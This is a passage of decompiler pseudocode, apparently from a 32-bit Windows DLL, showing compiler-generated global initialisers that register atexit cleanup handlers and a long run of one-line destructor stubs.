  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101307C8);
  sub_1000D17D(dword_101939A8, v0);
  return atexit(sub_100F3D11);
}
// 101939A8: using guessed type _DWORD dword_101939A8[2];

//----- (100F2D49) --------------------------------------------------------
int sub_100F2D49()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101306C8);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_101939B0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3D1B);
}
// 101939B0: using guessed type _DWORD dword_101939B0[2];

//----- (100F2D9D) --------------------------------------------------------
int sub_100F2D9D()
{
  sub_1000728E(dword_1017DB58, 0);
  return atexit(sub_100F3D25);
}
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];

//----- (100F2DB7) --------------------------------------------------------
int sub_100F2DB7()
{
  sub_10050B91(dword_10193D40, 0);
  return atexit(sub_100F3D2F);
}
// 10193D40: using guessed type _DWORD dword_10193D40[2];

//----- (100F2DD1) --------------------------------------------------------
int sub_100F2DD1()
{
  sub_1001EC12((int)dword_10193D48);
  return atexit(sub_100F3D43);
}
// 10193D48: using guessed type int dword_10193D48[9];

//----- (100F2DE7) --------------------------------------------------------
int sub_100F2DE7()
{
  return atexit(sub_100F3D39);
}

//----- (100F2DF3) --------------------------------------------------------
int sub_100F2DF3()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1013052C);
  sub_1000D17D(dword_101939B8, v0);
  return atexit(sub_100F3D4D);
}
// 101939B8: using guessed type _DWORD dword_101939B8[2];

//----- (100F2E15) --------------------------------------------------------
int sub_100F2E15()
{
  int result; // eax

  result = sub_1000CBFA((int)&unk_10130358);
  dword_1017DB60 = result;
  return result;
}
// 1017DB60: using guessed type int dword_1017DB60;

//----- (100F2E26) --------------------------------------------------------
int sub_100F2E26()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10130370);
  sub_1000D17D(dword_101939E0, v0);
  return atexit(sub_100F3D57);
}
// 101939E0: using guessed type _DWORD dword_101939E0[2];

//----- (100F2E48) --------------------------------------------------------
int sub_100F2E48()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101303A0);
  sub_1000D17D(dword_101939C0, v0);
  return atexit(sub_100F3D61);
}
// 101939C0: using guessed type _DWORD dword_101939C0[2];

//----- (100F2E6A) --------------------------------------------------------
int sub_100F2E6A()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101303CC);
  sub_1000D17D(dword_101939C8, v0);
  return atexit(sub_100F3D6B);
}
// 101939C8: using guessed type _DWORD dword_101939C8[2];

//----- (100F2E8C) --------------------------------------------------------
int sub_100F2E8C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10130404);
  sub_1000D17D(dword_101939D8, v0);
  return atexit(sub_100F3D75);
}
// 101939D8: using guessed type _DWORD dword_101939D8[2];

//----- (100F2EAE) --------------------------------------------------------
int sub_100F2EAE()
{
  sub_1000D17D(dword_101939D0, asc_10130430);
  return atexit(sub_100F3D7F);
}
// 101939D0: using guessed type _DWORD dword_101939D0[2];

//----- (100F2EC9) --------------------------------------------------------
int sub_100F2EC9()
{
  sub_1001EC12((int)dword_10193D6C);
  return atexit(sub_100F3D93);
}
// 10193D6C: using guessed type int dword_10193D6C[9];

//----- (100F2EDF) --------------------------------------------------------
int sub_100F2EDF()
{
  return atexit(sub_100F3D89);
}

//----- (100F2EEB) --------------------------------------------------------
int *sub_100F2EEB()
{
  int *result; // eax
  int i; // ecx

  result = dword_101939E8;
  for ( i = 37; i >= 0; --i )
  {
    *result = 0;
    result[1] = 0;
    result += 2;
  }
  return result;
}
// 101939E8: using guessed type int dword_101939E8[];

//----- (100F2F06) --------------------------------------------------------
void __cdecl sub_100F2F06()
{
  sub_1000D3AD((int *)&unk_101864D4);
}

//----- (100F2F10) --------------------------------------------------------
void __cdecl sub_100F2F10()
{
  sub_1000D3AD(&dword_10193B3C);
}
// 10193B3C: using guessed type int dword_10193B3C;

//----- (100F2F1A) --------------------------------------------------------
void __cdecl sub_100F2F1A()
{
  sub_1000D3AD((int *)&unk_1018653C);
}

//----- (100F2F24) --------------------------------------------------------
void __cdecl sub_100F2F24()
{
  sub_1000D3AD((int *)&unk_1018667C);
}

//----- (100F2F2E) --------------------------------------------------------
void __cdecl sub_100F2F2E()
{
  sub_1000D3AD((int *)&unk_10186734);
}

//----- (100F2F38) --------------------------------------------------------
void __cdecl sub_100F2F38()
{
  sub_1000D3AD((int *)&unk_10186794);
}

//----- (100F2F42) --------------------------------------------------------
void __cdecl sub_100F2F42()
{
  sub_1000D3AD((int *)&unk_10186804);
}

//----- (100F2F4C) --------------------------------------------------------
void __cdecl sub_100F2F4C()
{
  sub_1000D3AD((int *)&unk_10186584);
}

//----- (100F2F56) --------------------------------------------------------
void __cdecl sub_100F2F56()
{
  sub_1000D3AD((int *)&unk_10186624);
}

//----- (100F2F60) --------------------------------------------------------
void __cdecl sub_100F2F60()
{
  sub_1000D3AD((int *)&unk_1018666C);
}

//----- (100F2F6A) --------------------------------------------------------
void __cdecl sub_100F2F6A()
{
  sub_1000D3AD((int *)&unk_101865FC);
}

//----- (100F2F74) --------------------------------------------------------
void __cdecl sub_100F2F74()
{
  sub_1000D3AD((int *)&unk_10186544);
}

//----- (100F2F7E) --------------------------------------------------------
void __cdecl sub_100F2F7E()
{
  sub_1000D3AD((int *)&unk_101866EC);
}

//----- (100F2F88) --------------------------------------------------------
void __cdecl sub_100F2F88()
{
  sub_1000D3AD((int *)&unk_10186634);
}

//----- (100F2F92) --------------------------------------------------------
void __cdecl sub_100F2F92()
{
  sub_1000D3AD((int *)&unk_1018656C);
}

//----- (100F2F9C) --------------------------------------------------------
void __cdecl sub_100F2F9C()
{
  sub_1000D3AD((int *)&unk_1018679C);
}

//----- (100F2FA6) --------------------------------------------------------
void __cdecl sub_100F2FA6()
{
  sub_1000D3AD((int *)&unk_101865DC);
}

//----- (100F2FB0) --------------------------------------------------------
void __cdecl sub_100F2FB0()
{
  sub_1000D3AD((int *)&unk_10186574);
}

//----- (100F2FBA) --------------------------------------------------------
void __cdecl sub_100F2FBA()
{
  sub_1000D3AD((int *)&unk_1018658C);
}

//----- (100F2FC4) --------------------------------------------------------
void __cdecl sub_100F2FC4()
{
  sub_1000D3AD((int *)&unk_101867F4);
}

//----- (100F2FCE) --------------------------------------------------------
void __cdecl sub_100F2FCE()
{
  sub_1000D3AD((int *)&unk_1018678C);
}

//----- (100F2FD8) --------------------------------------------------------
void __cdecl sub_100F2FD8()
{
  sub_1000D3AD((int *)&unk_101867B4);
}

//----- (100F2FE2) --------------------------------------------------------
void __cdecl sub_100F2FE2()
{
  sub_1000D3AD((int *)&unk_10186774);
}

//----- (100F2FEC) --------------------------------------------------------
void __cdecl sub_100F2FEC()
{
  sub_1000D3AD((int *)&unk_1018652C);
}

//----- (100F2FF6) --------------------------------------------------------
void __cdecl sub_100F2FF6()
{
  sub_1000D3AD((int *)&unk_101864F4);
}

//----- (100F3000) --------------------------------------------------------
void __cdecl sub_100F3000()
{
  sub_1000D3AD((int *)&unk_101867C4);
}

//----- (100F300A) --------------------------------------------------------
void __cdecl sub_100F300A()
{
  sub_1000D3AD((int *)&unk_10186554);
}

//----- (100F3014) --------------------------------------------------------
void __cdecl sub_100F3014()
{
  sub_1000D3AD((int *)&unk_1018664C);
}

//----- (100F301E) --------------------------------------------------------
void __cdecl sub_100F301E()
{
  sub_1000D3AD((int *)&unk_10186654);
}

//----- (100F3028) --------------------------------------------------------
void __cdecl sub_100F3028()
{
  sub_1000D3AD((int *)&unk_1018650C);
}

//----- (100F3032) --------------------------------------------------------
void __cdecl sub_100F3032()
{
  sub_1000D3AD((int *)&unk_101866BC);
}

//----- (100F303C) --------------------------------------------------------
void __cdecl sub_100F303C()
{
  sub_1000D3AD((int *)&unk_101867AC);
}

//----- (100F3046) --------------------------------------------------------
void __cdecl sub_100F3046()
{
  sub_1000D3AD((int *)&unk_101866FC);
}

//----- (100F3050) --------------------------------------------------------
void __cdecl sub_100F3050()
{
  sub_1000D3AD((int *)&unk_101865C4);
}

//----- (100F305A) --------------------------------------------------------
void __cdecl sub_100F305A()
{
  sub_1000D3AD((int *)&unk_1018659C);
}

//----- (100F3064) --------------------------------------------------------
void __cdecl sub_100F3064()
{
  sub_1000D3AD((int *)&unk_1018680C);
}

//----- (100F306E) --------------------------------------------------------
void __cdecl sub_100F306E()
{
  sub_1000D3AD((int *)&unk_1018677C);
}

//----- (100F3078) --------------------------------------------------------
void __cdecl sub_100F3078()
{
  sub_1000D3AD((int *)&unk_101866DC);
}

//----- (100F3082) --------------------------------------------------------
void __cdecl sub_100F3082()
{
  sub_1000D3AD((int *)&unk_101866E4);
}

//----- (100F308C) --------------------------------------------------------
void __cdecl sub_100F308C()
{
  sub_1000D3AD((int *)&unk_10186784);
}

//----- (100F3096) --------------------------------------------------------
void __cdecl sub_100F3096()
{
  sub_1000D3AD((int *)&unk_1018669C);
}

//----- (100F30A0) --------------------------------------------------------
void __cdecl sub_100F30A0()
{
  sub_1000D3AD((int *)&unk_10186614);
}

//----- (100F30AA) --------------------------------------------------------
void __cdecl sub_100F30AA()
{
  sub_1000D3AD((int *)&unk_101865E4);
}

//----- (100F30B4) --------------------------------------------------------
void __cdecl sub_100F30B4()
{
  sub_1000D3AD((int *)&unk_101867A4);
}

//----- (100F30BE) --------------------------------------------------------
void __cdecl sub_100F30BE()
{
  sub_1000D3AD((int *)&unk_1018663C);
}

//----- (100F30C8) --------------------------------------------------------
void __cdecl sub_100F30C8()
{
  sub_1000D3AD((int *)&unk_101865BC);
}

//----- (100F30D2) --------------------------------------------------------
void __cdecl sub_100F30D2()
{
  sub_1000D3AD((int *)&unk_1018671C);
}

//----- (100F30DC) --------------------------------------------------------
void __cdecl sub_100F30DC()
{
  sub_1000D3AD((int *)&unk_1018654C);
}

//----- (100F30E6) --------------------------------------------------------
void __cdecl sub_100F30E6()
{
  sub_1000D3AD((int *)&unk_101866D4);
}

//----- (100F30F0) --------------------------------------------------------
void __cdecl sub_100F30F0()
{
  sub_1000D3AD((int *)&unk_101866AC);
}

//----- (100F30FA) --------------------------------------------------------
void __cdecl sub_100F30FA()
{
  sub_1000D3AD((int *)&unk_101866B4);
}

//----- (100F3104) --------------------------------------------------------
void __cdecl sub_100F3104()
{
  sub_1000D3AD((int *)&unk_10186694);
}

//----- (100F310E) --------------------------------------------------------
void __cdecl sub_100F310E()
{
  sub_1000D3AD((int *)&unk_10186724);
}

//----- (100F3118) --------------------------------------------------------
void __cdecl sub_100F3118()
{
  sub_1000D3AD((int *)&unk_1018651C);
}

//----- (100F3122) --------------------------------------------------------
void __cdecl sub_100F3122()
{
  sub_1000D3AD((int *)&unk_1018670C);
}

//----- (100F312C) --------------------------------------------------------
void __cdecl sub_100F312C()
{
  sub_1000D3AD((int *)&unk_101864EC);
}

//----- (100F3136) --------------------------------------------------------
void __cdecl sub_100F3136()
{
  sub_1000D3AD((int *)&unk_1018660C);
}

//----- (100F3140) --------------------------------------------------------
void __cdecl sub_100F3140()
{
  sub_1000D3AD((int *)&unk_101864E4);
}

//----- (100F314A) --------------------------------------------------------
void __cdecl sub_100F314A()
{
  sub_1000D3AD((int *)&unk_101867BC);
}

//----- (100F3154) --------------------------------------------------------
void __cdecl sub_100F3154()
{
  sub_1000D3AD((int *)&unk_101867FC);
}

//----- (100F315E) --------------------------------------------------------
void __cdecl sub_100F315E()
{
  sub_1000D3AD((int *)&unk_10186524);
}

//----- (100F3168) --------------------------------------------------------
void __cdecl sub_100F3168()
{
  sub_1000D3AD((int *)&unk_1018662C);
}

//----- (100F3172) --------------------------------------------------------
void __cdecl sub_100F3172()
{
  sub_1000D3AD((int *)&unk_101865F4);
}

//----- (100F317C) --------------------------------------------------------
void __cdecl sub_100F317C()
{
  sub_1000D3AD((int *)&unk_10186814);
}

//----- (100F3186) --------------------------------------------------------
void __cdecl sub_100F3186()
{
  sub_1000D3AD((int *)&unk_101866C4);
}

//----- (100F3190) --------------------------------------------------------
void __cdecl sub_100F3190()
{
  sub_1000D3AD((int *)&unk_10186704);
}

//----- (100F319A) --------------------------------------------------------
void __cdecl sub_100F319A()
{
  sub_1000D3AD((int *)&unk_1018672C);
}

//----- (100F31A4) --------------------------------------------------------
void __cdecl sub_100F31A4()
{
  sub_1000D3AD((int *)&unk_10186594);
}

//----- (100F31AE) --------------------------------------------------------
void __cdecl sub_100F31AE()
{
  sub_1000D3AD((int *)&unk_101867CC);
}

//----- (100F31B8) --------------------------------------------------------
void __cdecl sub_100F31B8()
{
  sub_1000D3AD((int *)&unk_10186564);
}

//----- (100F31C2) --------------------------------------------------------
void __cdecl sub_100F31C2()
{
  sub_1000D3AD((int *)&unk_1018665C);
}

//----- (100F31CC) --------------------------------------------------------
void __cdecl sub_100F31CC()
{
  sub_1000D3AD((int *)&unk_10186514);
}

//----- (100F31D6) --------------------------------------------------------
void __cdecl sub_100F31D6()
{
  sub_1000D3AD((int *)&unk_101865A4);
}

//----- (100F31E0) --------------------------------------------------------
void __cdecl sub_100F31E0()
{
  sub_1000D3AD((int *)&unk_101864FC);
}

//----- (100F31EA) --------------------------------------------------------
void __cdecl sub_100F31EA()
{
  sub_1000D3AD((int *)&unk_101866A4);
}

//----- (100F31F4) --------------------------------------------------------
void __cdecl sub_100F31F4()
{
  sub_1000D3AD((int *)&unk_101866F4);
}

//----- (100F31FE) --------------------------------------------------------
void __cdecl sub_100F31FE()
{
  sub_1000D3AD((int *)&unk_101867E4);
}

//----- (100F3208) --------------------------------------------------------
void __cdecl sub_100F3208()
{
  sub_1000D3AD((int *)&unk_10186644);
}

//----- (100F3212) --------------------------------------------------------
void __cdecl sub_100F3212()
{
  sub_1000D3AD((int *)&unk_10186754);
}

//----- (100F321C) --------------------------------------------------------
void __cdecl sub_100F321C()
{
  sub_1000D3AD((int *)&unk_10186764);
}

//----- (100F3226) --------------------------------------------------------
void __cdecl sub_100F3226()
{
  sub_1000D3AD((int *)&unk_101867D4);
}

//----- (100F3230) --------------------------------------------------------
void __cdecl sub_100F3230()
{
  sub_1000D3AD((int *)&unk_101865D4);
}

//----- (100F323A) --------------------------------------------------------
void __cdecl sub_100F323A()
{
  sub_1000D3AD((int *)&unk_10186664);
}

//----- (100F3244) --------------------------------------------------------
void __cdecl sub_100F3244()
{
  sub_1000D3AD((int *)&unk_10186684);
}

//----- (100F324E) --------------------------------------------------------
void __cdecl sub_100F324E()
{
  sub_1000D3AD((int *)&unk_101866CC);
}

//----- (100F3258) --------------------------------------------------------
void __cdecl sub_100F3258()
{
  sub_1000D3AD((int *)&unk_10186604);
}

//----- (100F3262) --------------------------------------------------------
void __cdecl sub_100F3262()
{
  sub_1000D3AD((int *)&unk_1018673C);
}

//----- (100F326C) --------------------------------------------------------
void __cdecl sub_100F326C()
{
  sub_1000D3AD((int *)&unk_101865AC);
}

//----- (100F3276) --------------------------------------------------------
void __cdecl sub_100F3276()
{
  sub_1000D3AD((int *)&unk_101867EC);
}

//----- (100F3280) --------------------------------------------------------
void __cdecl sub_100F3280()
{
  sub_1000D3AD((int *)&unk_1018668C);
}

//----- (100F328A) --------------------------------------------------------
void __cdecl sub_100F328A()
{
  sub_1000D3AD((int *)&unk_101865B4);
}

//----- (100F3294) --------------------------------------------------------
void __cdecl sub_100F3294()
{
  sub_1000D3AD((int *)&unk_1018655C);
}

//----- (100F329E) --------------------------------------------------------
void __cdecl sub_100F329E()
{
  sub_1000D3AD((int *)&unk_1018676C);
}

//----- (100F32A8) --------------------------------------------------------
void __cdecl sub_100F32A8()
{
  sub_1000D3AD((int *)&unk_101865CC);
}

//----- (100F32B2) --------------------------------------------------------
void __cdecl sub_100F32B2()
{
  sub_1000D3AD((int *)&unk_1018675C);
}

//----- (100F32BC) --------------------------------------------------------
void __cdecl sub_100F32BC()
{
  sub_1000D3AD((int *)&unk_10186744);
}

//----- (100F32C6) --------------------------------------------------------
void __cdecl sub_100F32C6()
{
  sub_1000D3AD((int *)&unk_1018674C);
}

//----- (100F32D0) --------------------------------------------------------
void __cdecl sub_100F32D0()
{
  sub_1000D3AD((int *)&unk_10186534);
}

//----- (100F32DA) --------------------------------------------------------
void __cdecl sub_100F32DA()
{
  sub_1000D3AD((int *)&unk_101865EC);
}

//----- (100F32E4) --------------------------------------------------------
void __cdecl sub_100F32E4()
{
  sub_1000D3AD((int *)&unk_1018661C);
}

//----- (100F32EE) --------------------------------------------------------
void __cdecl sub_100F32EE()
{
  sub_1000D3AD((int *)&unk_10186674);
}

//----- (100F32F8) --------------------------------------------------------
void __cdecl sub_100F32F8()
{
  sub_1000D3AD((int *)&unk_1018657C);
}

//----- (100F3302) --------------------------------------------------------
void __cdecl sub_100F3302()
{
  sub_1000D3AD((int *)&unk_101864DC);
}

//----- (100F330C) --------------------------------------------------------
void __cdecl sub_100F330C()
{
  sub_1000D3AD((int *)&unk_101867DC);
}

//----- (100F3316) --------------------------------------------------------
void __cdecl sub_100F3316()
{
  sub_1000D3AD((int *)&unk_10186714);
}

//----- (100F3320) --------------------------------------------------------
void __cdecl sub_100F3320()
{
  sub_1000D3AD((int *)&unk_10186504);
}

//----- (100F332A) --------------------------------------------------------
void __cdecl sub_100F332A()
{
  sub_10002F79(&dword_10183460);
}
// 10183460: using guessed type int dword_10183460;

//----- (100F3335) --------------------------------------------------------
void __cdecl sub_100F3335()
{
  sub_10002F79(&dword_101832B0);
}
// 101832B0: using guessed type int dword_101832B0;

//----- (100F3340) --------------------------------------------------------
void __cdecl sub_100F3340()
{
  sub_1000780D(dword_10193B84);
}
// 10193B84: using guessed type _DWORD dword_10193B84[2];

//----- (100F334A) --------------------------------------------------------
void __cdecl sub_100F334A()
{
  sub_100057B7(dword_10193B44);
}
// 10193B44: using guessed type _DWORD dword_10193B44[4];

//----- (100F3354) --------------------------------------------------------
void __cdecl sub_100F3354()
{
  sub_1000646B(dword_10193B98);
}
// 10193B98: using guessed type LONG dword_10193B98[8];

//----- (100F335E) --------------------------------------------------------
void __cdecl sub_100F335E()
{
  sub_1000522C((int *)&unk_10193B74);
}

//----- (100F3368) --------------------------------------------------------
void __cdecl sub_100F3368()
{
  sub_1000780D(dword_10193B8C);
}
// 10193B8C: using guessed type _DWORD dword_10193B8C[3];

//----- (100F3372) --------------------------------------------------------
void __cdecl sub_100F3372()
{
  sub_10003111(dword_10193B54);
}
// 10193B54: using guessed type int dword_10193B54[8];

//----- (100F337C) --------------------------------------------------------
void __cdecl sub_100F337C()
{
  sub_1000D3AD((int *)&unk_1018687C);
}

//----- (100F3386) --------------------------------------------------------
void __cdecl sub_100F3386()
{
  sub_1000D3AD((int *)&unk_10186834);
}

//----- (100F3390) --------------------------------------------------------
void __cdecl sub_100F3390()
{
  sub_1000D3AD((int *)&unk_10186874);
}

//----- (100F339A) --------------------------------------------------------
void __cdecl sub_100F339A()
{
  sub_1000A159(&dword_10186884);
}
// 10186884: using guessed type int dword_10186884;

//----- (100F33A4) --------------------------------------------------------
void __cdecl sub_100F33A4()
{
  sub_1000780D(&dword_10186824);
}
// 10186824: using guessed type int dword_10186824;

//----- (100F33AE) --------------------------------------------------------
void __cdecl sub_100F33AE()
{
  sub_1000780D(dword_1018682C);
}
// 1018682C: using guessed type _DWORD dword_1018682C[2];

//----- (100F33B8) --------------------------------------------------------
void __cdecl sub_100F33B8()
{
  sub_1000780D(dword_1018681C);
}
// 1018681C: using guessed type _DWORD dword_1018681C[2];

//----- (100F33C2) --------------------------------------------------------
void __cdecl sub_100F33C2()
{
  sub_1000780D(dword_1018683C);
}
// 1018683C: using guessed type _DWORD dword_1018683C[2];

//----- (100F33CC) --------------------------------------------------------
void __cdecl sub_100F33CC()
{
  sub_1000780D(dword_10186854);
}
// 10186854: using guessed type _DWORD dword_10186854[2];

//----- (100F33D6) --------------------------------------------------------
void __cdecl sub_100F33D6()
{
  sub_1000A311(dword_1018685C);
}
// 1018685C: using guessed type _DWORD dword_1018685C[4];

//----- (100F33E0) --------------------------------------------------------
void __cdecl sub_100F33E0()
{
  sub_1000A311(dword_10186844);
}
// 10186844: using guessed type _DWORD dword_10186844[4];

//----- (100F33EF) --------------------------------------------------------
void __cdecl sub_100F33EF()
{
  sub_100068A5(dword_1018688C);
}
// 1018688C: using guessed type int dword_1018688C[4];

//----- (100F33F9) --------------------------------------------------------
void __cdecl sub_100F33F9()
{
  sub_1000D3AD(&dword_1018689C);
}
// 1018689C: using guessed type int dword_1018689C;

//----- (100F3403) --------------------------------------------------------
void __cdecl sub_100F3403()
{
  sub_1000B3DF(dword_10193BE0);
}
// 10193BE0: using guessed type LONG dword_10193BE0[6];

//----- (100F340D) --------------------------------------------------------
void __cdecl sub_100F340D()
{
  sub_1000780D(dword_10193BD8);
}
// 10193BD8: using guessed type _DWORD dword_10193BD8[2];

//----- (100F3417) --------------------------------------------------------
void __cdecl sub_100F3417()
{
  sub_100099A2(dword_10193BB8);
}
// 10193BB8: using guessed type _DWORD dword_10193BB8[4];

//----- (100F3421) --------------------------------------------------------
void __cdecl sub_100F3421()
{
  sub_1000A159(&dword_1017DB0C);
}
// 1017DB0C: using guessed type _DWORD dword_1017DB0C;

//----- (100F342B) --------------------------------------------------------
void __cdecl sub_100F342B()
{
  sub_1000D3AD((int *)&unk_101868A4);
}

//----- (100F3435) --------------------------------------------------------
void __cdecl sub_100F3435()
{
  sub_1000D3AD((int *)&unk_101868AC);
}

//----- (100F343F) --------------------------------------------------------
void __cdecl sub_100F343F()
{
  sub_1000A159(&dword_1017DB14);
}
// 1017DB14: using guessed type _DWORD dword_1017DB14;

//----- (100F3449) --------------------------------------------------------
void __cdecl sub_100F3449()
{
  sub_10015B97(&off_10182DD4);
}
// 10182DD4: using guessed type int (__thiscall **off_10182DD4)(void *Block, char);

//----- (100F3453) --------------------------------------------------------
void __cdecl sub_100F3453()
{
  sub_1000D3AD(dword_101868B4);
}
// 101868B4: using guessed type _DWORD dword_101868B4[2];

//----- (100F345D) --------------------------------------------------------
void __cdecl sub_100F345D()
{
  sub_1000D3AD((int *)&unk_101868C4);
}

//----- (100F3467) --------------------------------------------------------
void __cdecl sub_100F3467()
{
  sub_1000D3AD((int *)&unk_101868CC);
}

//----- (100F3471) --------------------------------------------------------
void __cdecl sub_100F3471()
{
  sub_1000D3AD((int *)&unk_101868D4);
}

//----- (100F347B) --------------------------------------------------------
void __cdecl sub_100F347B()
{
  sub_1000D3AD((int *)&unk_101868EC);
}

//----- (100F3485) --------------------------------------------------------
void __cdecl sub_100F3485()
{
  sub_1000D3AD((int *)&unk_101868DC);
}

//----- (100F348F) --------------------------------------------------------
void __cdecl sub_100F348F()
{
  sub_1000D3AD((int *)&unk_101868BC);
}

//----- (100F3499) --------------------------------------------------------
void __cdecl sub_100F3499()
{
  sub_1000D3AD((int *)&unk_101868E4);
}

//----- (100F34A3) --------------------------------------------------------
void __cdecl sub_100F34A3()
{
  sub_1001211A(byte_10193BF8);
}

//----- (100F34AD) --------------------------------------------------------
void __cdecl sub_100F34AD()
{
  sub_10015B97(&off_10182DDC);
}
// 10182DDC: using guessed type int (__thiscall **off_10182DDC)(void *Block, char);

//----- (100F34B7) --------------------------------------------------------
void __cdecl sub_100F34B7()
{
  sub_1000D3AD((int *)&unk_101868F4);
}

//----- (100F34C1) --------------------------------------------------------
void __cdecl sub_100F34C1()
{
  sub_1001519C((LPVOID *)&dword_1017DB1C);
}
// 1017DB1C: using guessed type int dword_1017DB1C;

//----- (100F34CB) --------------------------------------------------------
void __cdecl sub_100F34CB()
{
  sub_10015B97(&off_1017DB04);
}
// 1017DB04: using guessed type int (__thiscall **off_1017DB04)(void *Block, char);

//----- (100F34D5) --------------------------------------------------------
void __cdecl sub_100F34D5()
{
  sub_1000D3AD(dword_101868FC);
}
// 101868FC: using guessed type _DWORD dword_101868FC[2];

//----- (100F34DF) --------------------------------------------------------
void __cdecl sub_100F34DF()
{
  sub_1000B3DF(dword_10186904);
}
// 10186904: using guessed type _DWORD dword_10186904[5];

//----- (100F34E9) --------------------------------------------------------
void __cdecl sub_100F34E9()
{
  sub_1000D3AD(dword_10186918);
}
// 10186918: using guessed type _DWORD dword_10186918[2];

//----- (100F34F3) --------------------------------------------------------
void __cdecl sub_100F34F3()
{
  sub_1000D3AD((int *)&unk_10186920);
}

//----- (100F34FD) --------------------------------------------------------
void __cdecl sub_100F34FD()
{
  sub_100194A1((void **)&off_101835EC);
}
// 101835EC: using guessed type int (__thiscall **off_101835EC)(void *Block, char);

//----- (100F3507) --------------------------------------------------------
void __cdecl sub_100F3507()
{
  sub_1001ECA1(dword_10193C18);
}
// 10193C18: using guessed type int dword_10193C18[9];

//----- (100F3511) --------------------------------------------------------
void __cdecl sub_100F3511()
{
  sub_1000D3AD((int *)&unk_10186950);
}

//----- (100F351B) --------------------------------------------------------
void __cdecl sub_100F351B()
{
  sub_1000D3AD((int *)&unk_10186940);
}

//----- (100F3525) --------------------------------------------------------
void __cdecl sub_100F3525()
{
  sub_1000D3AD((int *)&unk_10186948);
}

//----- (100F352F) --------------------------------------------------------
void __cdecl sub_100F352F()
{
  sub_1000D3AD((int *)&unk_10186928);
}

//----- (100F3539) --------------------------------------------------------
void __cdecl sub_100F3539()
{
  sub_1000D3AD((int *)&unk_10186938);
}

//----- (100F3543) --------------------------------------------------------
void __cdecl sub_100F3543()
{
  sub_1000D3AD((int *)&unk_10186930);
}

//----- (100F354D) --------------------------------------------------------
void __cdecl sub_100F354D()
{
  sub_1000D3AD((int *)&unk_10186968);
}

//----- (100F3557) --------------------------------------------------------
void __cdecl sub_100F3557()
{
  sub_1000D3AD((int *)&unk_10186958);
}

//----- (100F3561) --------------------------------------------------------
void __cdecl sub_100F3561()
{
  sub_1000D3AD((int *)&unk_10186960);
}

//----- (100F356B) --------------------------------------------------------
void __cdecl sub_100F356B()
{
  sub_1001B56C(dword_10193C3C);
}
// 10193C3C: using guessed type _DWORD dword_10193C3C[3];

//----- (100F3575) --------------------------------------------------------
void __cdecl sub_100F3575()
{
  sub_1001BA98(&off_101835F4);
}
// 101835F4: using guessed type int (__thiscall **off_101835F4)(void *Block, char);

//----- (100F357F) --------------------------------------------------------
void __cdecl sub_100F357F()
{
  sub_1001ECA1(dword_10193C48);
}
// 10193C48: using guessed type int dword_10193C48[9];

//----- (100F3589) --------------------------------------------------------
void __cdecl sub_100F3589()
{
  sub_1000D3AD((int *)&unk_10186970);
}

//----- (100F3593) --------------------------------------------------------
void __cdecl sub_100F3593()
{
  sub_1000D3AD(dword_1017DB2C);
}
// 1017DB2C: using guessed type _DWORD dword_1017DB2C[2];

//----- (100F359D) --------------------------------------------------------
void __cdecl sub_100F359D()
{
  sub_1000D3AD((int *)&unk_10186978);
}

//----- (100F35A7) --------------------------------------------------------
void __cdecl sub_100F35A7()
{
  sub_1000D3AD(dword_10186980);
}
// 10186980: using guessed type _DWORD dword_10186980[2];

//----- (100F35B1) --------------------------------------------------------
void __cdecl sub_100F35B1()
{
  sub_1000D3AD((int *)&unk_10186988);
}

//----- (100F35BB) --------------------------------------------------------
void __cdecl sub_100F35BB()
{
  sub_1000D3AD((int *)&unk_10186998);
}

//----- (100F35C5) --------------------------------------------------------
void __cdecl sub_100F35C5()
{
  sub_1000D3AD((int *)&unk_10186990);
}

//----- (100F35CF) --------------------------------------------------------
void __cdecl sub_100F35CF()
{
  sub_1000D3AD((int *)&unk_101869D8);
}

//----- (100F35D9) --------------------------------------------------------
void __cdecl sub_100F35D9()
{
  sub_1000D3AD((int *)&unk_101869C8);
}

//----- (100F35E3) --------------------------------------------------------
void __cdecl sub_100F35E3()
{
  sub_1000D3AD((int *)&unk_101869B0);
}

//----- (100F35ED) --------------------------------------------------------
void __cdecl sub_100F35ED()
{
  sub_1000D3AD((int *)&unk_101869B8);
}

//----- (100F35F7) --------------------------------------------------------
void __cdecl sub_100F35F7()
{
  sub_1000D3AD((int *)&unk_101869A0);
}

//----- (100F3601) --------------------------------------------------------
void __cdecl sub_100F3601()
{
  sub_1000D3AD((int *)&unk_101869D0);
}

//----- (100F360B) --------------------------------------------------------
void __cdecl sub_100F360B()
{
  sub_1000D3AD((int *)&unk_101869A8);
}

//----- (100F3615) --------------------------------------------------------
void __cdecl sub_100F3615()
{
  sub_1000D3AD((int *)&unk_101869C0);
}

//----- (100F361F) --------------------------------------------------------
void __cdecl sub_100F361F()
{
  sub_10021E66(&off_101835FC);
}
// 101835FC: using guessed type int (__thiscall **off_101835FC)(void *Block, char);

//----- (100F3629) --------------------------------------------------------
void __cdecl sub_100F3629()
{
  sub_1001ECA1(dword_10193C6C);
}
// 10193C6C: using guessed type int dword_10193C6C[9];

//----- (100F3633) --------------------------------------------------------
void __cdecl sub_100F3633()
{
  sub_1000D3AD((int *)&unk_101869E8);
}

//----- (100F363D) --------------------------------------------------------
void __cdecl sub_100F363D()
{
  sub_1000D3AD((int *)&unk_101869E0);
}

//----- (100F3647) --------------------------------------------------------
void __cdecl sub_100F3647()
{
  sub_1000D3AD((int *)&unk_10186A10);
}

//----- (100F3651) --------------------------------------------------------
void __cdecl sub_100F3651()
{
  sub_1000D3AD((int *)&unk_10186A18);
}

//----- (100F365B) --------------------------------------------------------
void __cdecl sub_100F365B()
{
  sub_1000D3AD((int *)&unk_10186A08);
}

//----- (100F3665) --------------------------------------------------------
